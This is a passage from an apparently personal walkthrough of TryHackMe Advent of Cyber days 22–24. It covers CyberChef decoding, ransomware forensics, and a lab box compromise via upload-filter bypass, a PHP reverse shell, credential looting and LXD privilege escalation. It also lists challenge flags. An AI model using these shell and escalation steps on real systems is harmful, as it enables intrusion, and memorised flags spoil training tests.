3.  **Qus :** Using Strings find the hidden flag within the executable?
    
    **Ans :** `THM{f6187e6cbeb1214139ef313e108cb6f9}`

4.  **Qus :** What is the flag that is displayed when you run the database connector file?
    
    **Ans :** `THM{088731ddc7b9fdeccaed982b07c297c}`

---

## Day 22 - Elf McEager becomes CyberElf[CyberChef]

### Walk-Through

1.  After logging into remote machine ran `keypass.exe` which was within the only desktop folder.

2.  Entered `mceagerrockstar` as password as suggested in the instructions. But it returned with a Falied mesaage-box.

3.  the folder name was changed and it looked cryptic so copied it and went to [cyberchef](https://gchq.github.io/CyberChef/). Using from Base64 Receipe got `thegrinchwashere` and it unlocked the `keypass` to me.

4.  inside I see a private folder and password entry
 in it titles `hiya` and password 'nothingtoseehere'. well it looks like the hacker left us a msg to taunt us.

5.  inside private folder there are some more folders. In Network folder I found password of `Elf Server` which is `736e30774d346e21` and it looks like it is encoded too. The note in it hints "HEXtra step to decrypt"

6.  Oh well putting the string again in cyberchef it decrypted it to `sn0M4n!` using `From Hex` Receipe.

7.  elfmail under email folder had a lot in the password field `&#105;&#99;&#51;&#83;&#107;&#97;&#116;&#105;&#110;&#103;&excl;`. Besides it had `Entities` as a Note.

8. again went to cyberchef asking for help. searched for entities in the reciep search bar found `HTML Entity` , using `From HTML Entity` decrypted the password.

9. The last encoded bit left by the hacker was in `Recycle bin` folder. it had `nothinghere` in the password and in the note section it had a lots of text. and it looked like JS.

    ```
    eval(String.fromCharCode(118, 97, 114, . . . . . . . . . . .  . 103, 41, 59, 32, 125));
    ```

    getting rid of the the `eval` and `String.fromCharCode` with the brackets associated with it I took it to `cyberchef` again. Using `from CharCode` Receipie twice I got a github link.

10. Visiting the link I got the Last Flag


### Challenge - Ans

1.  **Qus :** What is the password to the KeePass database?
    
    **Ans :** `dGhlZ3JpbmNod2FzaGVyZQ==`

2.  **Qus :** What is the encoding method listed as the 'Matching ops'?

    **Ans :** `base64`

3.  **Qus :** What is the decoded password value of the Elf Server?

    **Ans :** `sn0wM4n!`

4.  **Qus :** What is the decoded password value for ElfMail?

    **Ans :** `ic3Skating!`

5.  **Qus :** Decode the last encoded value. What is the flag?

    **Ans :** `THM{657012dcf3d1318dca0ed864f0e70535}`

--- 

## Day 23 - The Grinch strikes again![VSS, Task Scheduler]

### Challenges-Ans

1.  **Qus :**   Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?

    **Ans :**   open `RansomeNote.txt` copy bit coin address `bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==` and decrypt it in cyberchef with `From Base64` Receipe

2.  **Qus :**   At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?

    **Ans :**   - Open `Dist Management` and `windows explorer` side by side. You will see volume named `BackUP` is not listede in the windows explorer
                
                - right click on the volume -> `Change Drive Letter and Paths` -> `Add` -> `Assign the following drive letter` -> OK (You can assign any drive letter you want from the dropdownlist) 
                
                - now in `Windows Explorer` -> `View` tab -> check the check-box `File name extention` 

                - now navigate to the `backup` volume -> `vStockings` -> `elf*`

                - now look at the files present there.

3.  **Qus :**   What is the name of the suspicious scheduled task?

    **Ans :**   - Launch `Task Scheduler` -> `Task Schedular Library`

                - Look for the *suspicious* scheduled task (HINT : Description)

4.  **Qus :**   Inspect the properties of the scheduled task. What is the location of the executable that is run at login?

    **Ans :**   See the `Actions` Tab inside the properties of the suspicious task.

5.  **Qus :**   There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?

    **Ans :**   - Inside `Task Scheduler Library` look for the task that is related to VSS.

                - see the `Name` of the task under its properties. 

                - If not found in `Name` tab look into the `Actions` tab -> `Edit Action`, and look for `Add arguments`

                - volume id will be present in the form of `Volume{volume_id}`

                - besides you can list all the volume ids by the command `vssadmin list volumes`  

6.  **Qus :**   Assign the hidden partition a letter. What is the name of the hidden folder?

    **Ans :**   - goto the `backup` volume in `Windows Explorer`  
                
                - In `Windows Explorer` -> `View` tab -> check the check-box `Hidden items`


7.  **Qus :**   Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?

    **Ans :**   well the question sas it all BUT you can restore `vStockings` and see what was there before grinich encrypted them :)

## Day 24 - The Trial Before Christmas

target : `10.10.143.57`

found open ports : `80`, `65000`

directories found : `/api`, `/assets`, `/grid`

PHP files found: `/.htpasswd.php`, `/.htaccess.php`, `/index.php`, `uploads.php`

Server stack : Apache/2.4.29 (Ubuntu)



### Challenges Ans 

1.  **Qus :**   Scan the machine. What ports are open?

    **Ans :**   use nmap to scan the open ports 
                example : `nmap -sC -sV -O -v -oN nmap/sCsVO.log <target_ip>`

    -sC: equivalent to --script=default[SCRIPT SCAN]
    -sV: Probe open ports to determine service/version info[SERVICE/VERSION DETECTION]
    -O: Enable OS detection
    -v: verbose, i.e. nmap prints its state as it goes
    -oN <file>: Output scan in normal to the given filename.

2.  **Qus :**   What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 

    **Ans :**   open your browser and then goto `http://<target_ip>:port` [example : 10.10.143.57:80]
                try all the ports you found in your namp scan
                then to get title use `Ctrl + U` to view the source

3.  **Qus :**   What is the name of the hidden php page?

    **Ans :**   use gobuster with a wordlist to get the hidden php page
                
    example : `gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`

    In this case I used the following command :
                 
    `gobuster dir -u http://10.10.6.231:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobust_dir.log`

    Now Lets break down what each argument does

    dir                     Uses directory/file brutceforcing mode
    -u, --url                String The target URL
    -w, --wordlist string   Path to the wordlists
    -x, –extensions string File extension(s) to search for 
    -t, --threads int       Number of concurrent threads (default 10)
    -o, --output string     Output file to write results to (defaults to stdout)

4.  **Qus :**   What is the name of the hidden directory where file uploads are saved?

    **Ans :**   The above command will help you to answer this question too

5.  **Qus :**   Bypass the filters. Upload and execute a reverse shell. 

    **Ans :**   setup burpsuit with your browser : (https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/browser)
                
    launch burpsuit with default config then goto `proxy` -> options -> `intercep client-side Requests` -> click on the top line(Match type : file Extension) -> then edit -> remove `|^js$` from `Match Conditions`

    Next, go to the "Intercept Server Responses" section and select the "Intercept responses based on the following rules" checkbox

    This will now intercept all responses from the server, including the JavaScript files!

    Now we need to navigate to `http://target_ip:65000/uploads.php` with `intercept on` drop the request for `filter.js`

    Now do a test upload

    upload a php payload and go to the uploads(`/grid`) folder 

    listen on the port you specified(if not consider doing so -\_-) in the payload, I'm using netcat to catch the shell

    then the file in the browser to run it and automagically you'll get a shell back on the listning port

    you can get the payload from here : (https://github.com/pentestmonkey/php-reverse-shell) (of cource change listning the ip and port) 

6.  **Qus :**   What is the value of the web.txt flag?

    **Ans :**   after getting the shell change directory to `/var/www` you should find it here

7.  **Qus :**   Upgrade and stabilize your shell.

    **Ans :**   To stablize the shell :
    - `python3 -c import pty; pty.spwan("/bin/bash")`
    - `export TERM=xterm`
    - background the reverse shell by `Ctrl + Z`
    - then use `stty raw -echo; fg` to turn off our own terminal echo and foregrounds the shell.

8.  **Qus :**   Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

    **Ans :**   change directory to `/var/www/TheGrid/includes` and look for a file with `*auth*` in its name

9.  **Qus :**   Access the database and discover the encrypted credentials. What is the name of the database you find these in?

    **Ans :**   with the username and password login to the database with `mysql -utron -p` and enter the password.
    
    use `show databases;` to get the list of databases

10. **Qus :**   Crack the password. What is it?

    **Ans :**   to use the database type : `use tron;`
    
    use `show tables;` to list out the tables.

    type the command `select * from users` to get the username and hashed password.

    goto (https://crackstation.net/) to get the password in plain text.

11.  **Qus :** Use su to login to the newly discovered user by exploiting password reuse.

    **Ans :** after logging in with `su flynn_lives`

    by using `id` I came to know the user `flynn` is in `lxd` group.

    lets look for if any lxd image is already available in it by `lxc image list`

    initialze a lxd container with : `lxc Alpine badboy -c security.privileged=true`

    mount the file system to the container with `lxc config device add badboy trogdor disk source=/ path=/mnt/root recursive=true` 

    start the container with `lxc start badboy`

    use the container with `lxc exec badboy /bin/sh`

    now go to `/root/` to get the flag.
